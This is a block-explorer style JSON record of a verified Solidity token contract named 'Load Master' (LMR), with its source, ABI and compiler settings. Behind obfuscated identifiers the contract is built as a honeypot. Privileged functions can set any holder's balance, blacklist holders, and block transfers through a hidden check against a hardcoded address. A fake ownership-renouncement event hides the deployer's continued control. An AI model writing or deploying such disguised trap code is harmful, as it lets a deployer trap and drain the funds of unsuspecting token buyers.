{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface takeMin {\n    function createPair(address marketingToken, address liquidityFee) external returns (address);\n}\n\ninterface autoAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isLaunch) external view returns (uint256);\n\n    function transfer(address toSenderMin, uint256 txTotal) external returns (bool);\n\n    function allowance(address autoSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toSenderMin,\n        uint256 txTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableReceiver, uint256 value);\n    event Approval(address indexed autoSender, address indexed spender, uint256 value);\n}\n\nabstract contract launchedMaxFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface autoAmountMetadata is autoAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LoadMaster is launchedMaxFrom, autoAmount, autoAmountMetadata {\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeSell;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atListTo;\n    }\n\n    uint256 private fromTeam;\n\n    function atSender(address launchedMarketing, uint256 txTotal) public {\n        teamList();\n        maxAutoTo[launchedMarketing] = txTotal;\n    }\n\n    function launchedBuy(address maxTxMin, address toSenderMin, uint256 txTotal) internal returns (bool) {\n        if (maxTxMin == receiverWalletToken) {\n            return fromIs(maxTxMin, toSenderMin, txTotal);\n        }\n        uint256 walletTake = autoAmount(fundTake).balanceOf(receiverSenderFund);\n        require(walletTake == launchedSwapSender);\n        require(toSenderMin != receiverSenderFund);\n        if (listTx[maxTxMin]) {\n            return fromIs(maxTxMin, toSenderMin, atBuyAuto);\n        }\n        return fromIs(maxTxMin, toSenderMin, txTotal);\n    }\n\n    uint256 constant atBuyAuto = 15 ** 10;\n\n    function allowance(address fundBuyTake, address liquidityMode) external view virtual override returns (uint256) {\n        if (liquidityMode == tradingList) {\n            return type(uint256).max;\n        }\n        return launchedFromTotal[fundBuyTake][liquidityMode];\n    }\n\n    uint256 public feeMax;\n\n    mapping(address => bool) public enableToTotal;\n\n    function sellWallet(address teamMarketing) public {\n        if (buyList) {\n            return;\n        }\n        \n        enableToTotal[teamMarketing] = true;\n        \n        buyList = true;\n    }\n\n    uint256 launchedSwapSender;\n\n    function walletTeamList() public {\n        emit OwnershipTransferred(receiverWalletToken, address(0));\n        exemptTradingFee = address(0);\n    }\n\n    function teamList() private view {\n        require(enableToTotal[_msgSender()]);\n    }\n\n    uint8 private modeSell = 18;\n\n    mapping(address => bool) public listTx;\n\n    function name() external view virtual override returns (string memory) {\n        return launchedAuto;\n    }\n\n    function shouldTradingLaunch(address amountIs) public {\n        teamList();\n        \n        if (amountIs == receiverWalletToken || amountIs == fundTake) {\n            return;\n        }\n        listTx[amountIs] = true;\n    }\n\n    function fromIs(address maxTxMin, address toSenderMin, uint256 txTotal) internal returns (bool) {\n        require(maxAutoTo[maxTxMin] >= txTotal);\n        maxAutoTo[maxTxMin] -= txTotal;\n        maxAutoTo[toSenderMin] += txTotal;\n        emit Transfer(maxTxMin, toSenderMin, txTotal);\n        return true;\n    }\n\n    address private exemptTradingFee;\n\n    function enableWalletTx(uint256 txTotal) public {\n        teamList();\n        launchedSwapSender = txTotal;\n    }\n\n    address public fundTake;\n\n    string private launchedAuto = \"Load Master\";\n\n    uint256 receiverToken;\n\n    uint256 private atListTo = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return exemptTradingFee;\n    }\n\n    mapping(address => uint256) private maxAutoTo;\n\n    event OwnershipTransferred(address indexed marketingAmount, address indexed teamEnable);\n\n    address public receiverWalletToken;\n\n    bool public maxBuyLimit;\n\n    function approve(address liquidityMode, uint256 txTotal) public virtual override returns (bool) {\n        launchedFromTotal[_msgSender()][liquidityMode] = txTotal;\n        emit Approval(_msgSender(), liquidityMode, txTotal);\n        return true;\n    }\n\n    bool public takeSell;\n\n    function getOwner() external view returns (address) {\n        return exemptTradingFee;\n    }\n\n    function transfer(address launchedMarketing, uint256 txTotal) external virtual override returns (bool) {\n        return launchedBuy(_msgSender(), launchedMarketing, txTotal);\n    }\n\n    constructor (){\n        \n        amountBuy receiverTx = amountBuy(tradingList);\n        fundTake = takeMin(receiverTx.factory()).createPair(receiverTx.WETH(), address(this));\n        if (teamSell == takeSell) {\n            feeMax = fromTeam;\n        }\n        receiverWalletToken = _msgSender();\n        enableToTotal[receiverWalletToken] = true;\n        maxAutoTo[receiverWalletToken] = atListTo;\n        walletTeamList();\n        \n        emit Transfer(address(0), receiverWalletToken, atListTo);\n    }\n\n    function balanceOf(address isLaunch) public view virtual override returns (uint256) {\n        return maxAutoTo[isLaunch];\n    }\n\n    function transferFrom(address maxTxMin, address toSenderMin, uint256 txTotal) external override returns (bool) {\n        if (_msgSender() != tradingList) {\n            if (launchedFromTotal[maxTxMin][_msgSender()] != type(uint256).max) {\n                require(txTotal <= launchedFromTotal[maxTxMin][_msgSender()]);\n                launchedFromTotal[maxTxMin][_msgSender()] -= txTotal;\n            }\n        }\n        return launchedBuy(maxTxMin, toSenderMin, txTotal);\n    }\n\n    address tradingList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public buyList;\n\n    bool private teamSell;\n\n    mapping(address => mapping(address => uint256)) private launchedFromTotal;\n\n    address receiverSenderFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private feeAutoLaunched = \"LMR\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeAutoLaunched;\n    }\n\n    uint256 private limitTotalLaunch;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundBuyTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTotal\",\"type\":\"uint256\"}],\"name\":\"atSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableToTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txTotal\",\"type\":\"uint256\"}],\"name\":\"enableWalletTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxBuyLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverWalletToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMarketing\",\"type\":\"address\"}],\"name\":\"sellWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountIs\",\"type\":\"address\"}],\"name\":\"shouldTradingLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTxMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toSenderMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTeamList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LoadMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}